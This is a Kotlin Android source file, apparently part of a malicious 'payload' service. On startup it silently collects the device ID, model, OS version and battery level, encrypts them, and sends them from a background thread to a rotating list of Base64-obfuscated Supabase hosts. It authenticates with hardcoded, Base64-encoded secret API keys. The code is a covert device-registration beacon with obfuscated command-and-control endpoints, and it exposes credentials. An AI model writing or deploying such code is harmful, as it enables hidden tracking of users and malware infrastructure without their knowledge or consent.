package com.payload.service

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Base64
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object MainEntry {
    private val random = SecureRandom()
    private lateinit var deviceKey: ByteArray
    private var context: Context? = null

    private val nodes = listOf(
        "aHR0cHM6Ly93dWt5emdia2pjcnpzeGhudXRtaS5zdXBhYmFzZS5jby8=",
        "aHR0cHM6Ly9qcG5qanFpc2V2YXB2dWx3d3JnYi5zdXBhYmFzZS5jby8=",
        "aHR0cHM6Ly9ib3poZXJoc2FyY292dXR2cHJvYS5zdXBhYmFzZS5jby8=",
        "aHR0cHM6Ly95Ymh0aWN6b3R5dnl5dXhrZmt3di5zdXBhYmFzZS5jby8="
    )

    private val apiKeys = listOf(
        "c2Jfc2VjcmV0X2hfMmtfNUxTc19TSl82MVVUN3dtT0FfM21NalpOQlg=",
        "c2Jfc2VjcmV0X1VxTVVaaUlsTzhSZkdtUlZXTjRsc1FfYWhCampST0k=",
        "c2Jfc2VjcmV0X0tMM2xkTGUwWC0zaXMtbEdvTHZ6T3dfeThhODVFSA==",
        "c2JfcHVibGlzaGFibGVfYmhEc1lBRTNBamtFVHM4VUZHeUtfd19wN1Z5TU1zUA=="
    )

    @JvmStatic
    fun initialize(ctx: Context) {
        context = ctx
        val androidId = getDeviceId()
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
        registerDevice()
    }

    private fun registerDevice() {
        val data = JSONObject().apply {
            put("device_id", getDeviceId())
            put("model_name", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("android_version", Build.VERSION.RELEASE)
            put("battery_level", getBatteryLevel())
        }
        sendToTable(data.toString(), "client_configs")
    }

    private fun sendToTable(payload: String, table: String) {
        Thread {
            var attempt = 0
            while (attempt < nodes.size) {
                if (!checkConnectivity()) {
                    attempt++
                    continue
                }
                try {
                    val baseUrl = String(Base64.decode(nodes[attempt], Base64.DEFAULT)).trim().removeSuffix("/")
                    val apiKey = String(Base64.decode(apiKeys[attempt], Base64.DEFAULT)).trim()
                    
                    val url = URL("$baseUrl/rest/v1/$table")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("apikey", apiKey)
                    conn.setRequestProperty("Authorization", "Bearer $apiKey")
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("X-Device-ID", getDeviceId())
                    conn.setRequestProperty("Prefer", "return=minimal")
                    conn.connectTimeout = 10000

                    conn.outputStream.use { it.write(encrypt(payload.toByteArray())) }

                    if (conn.responseCode in 200..299) return@Thread
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                attempt++
            }
        }.start()
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), GCMParameterSpec(128, iv))
        return iv + cipher.doFinal(data)
    }

    private fun checkConnectivity(): Boolean {
        val cm = context?.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val capabilities = cm.getNetworkCapabilities(cm.activeNetwork)
            capabilities?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) ?: false
        } else {
            @Suppress("DEPRECATION")
            cm.activeNetworkInfo?.isConnected ?: false
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context?.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    private fun getBatteryLevel(): Int {
        val batteryStatus = context?.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
    }
}
